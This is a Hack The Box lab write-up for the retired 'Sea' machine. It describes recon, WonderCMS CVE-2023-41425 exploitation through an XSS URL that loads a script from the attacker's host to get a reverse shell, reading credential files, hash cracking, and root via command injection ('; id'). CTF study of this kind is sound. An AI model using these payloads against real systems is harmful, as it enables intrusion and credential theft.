---
machine: Sea
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, wondercms, cve-2023-41425, xss, rce, command-injection, hash-cracking]
---

# Sea — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Only 22 and 80. The site is **WonderCMS**, vulnerable to CVE-2023-41425: an XSS in theme installation lets you point at a malicious module and run code. As `www-data` a hash in the database cracks to `amay`. An internal web service on **8080** (authenticated with those credentials) has command injection and runs as root.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu
80/tcp open  http  Apache httpd 2.4.41
```

```bash
whatweb http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Typical WonderCMS layout at the root: `data/`, `plugins/`, `themes/`. The admin panel is `/loginURL` (or `?page=loginURL`), and the version comes from `data/database.js` or by comparing theme files.

```bash
curl -s http://<IP>/ | grep -i -E 'wondercms|generator'
```

## Access

**CVE-2023-41425** — XSS in `installModule` / `loginURL` that loads a theme/module ZIP under our control:

1. Host the malicious ZIP (`xss.js` plus a theme whose `index.php` runs a command).
2. Send the victim to the vulnerable URL:

```bash
http://sea.htb/loginURL?xss=<iframe src="http://<tun0>/xss.js"></iframe>
```

3. The JS downloads and installs the theme; visiting it fires the payload and the shell lands.

```bash
rlwrap nc -lvnp 4444
# www-data@sea
```

If the module does not execute directly, the equivalent route is dropping a `php` file into an installed theme and requesting its path.

With a shell, check the WonderCMS database and local users:

```bash
cat /var/www/html/data/database.js
cat /etc/passwd | grep sh$
```

Crack the hash found (bcrypt):

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
ssh amay@<IP>
```

## Escalation

`amay` has no direct sudo, but a web service listens on localhost only:

```bash
ss -tlnp
# 127.0.0.1:8080
```

Forward it and log in with the same credentials:

```bash
ssh -L 8080:127.0.0.1:8080 amay@<IP>
```

The panel (a purpose-built app for the box) has an "analysis" feature that passes input to a shell unsanitised. A command separator payload returns execution as root:

```text
; id
; cat /root/root.txt
```

If the reverse shell drops, chain `sleep` and run the command in the background, or create a sudo-enabled user from the panel itself.

## Pitfalls

- The WonderCMS XSS needs the victim's browser to load the JS; without an active admin, use direct module execution.
- The hash is bcrypt: `-m 3200`, not `-m 0`.
- Port 8080 is not reachable externally; the SSH tunnel is mandatory.
- Quote characters break in the form: URL-encode the payload.

## Lessons

- A CMS whose theme manager installs ZIPs without validation is RCE as soon as a session-holding victim visits.
- Password reuse between CMS and SSH turns a hash into system access.
- An internal service with weak auth and command injection running as root is the final failure.
- Mitigation: validate theme packages, run internal services under a dedicated user, never as root.
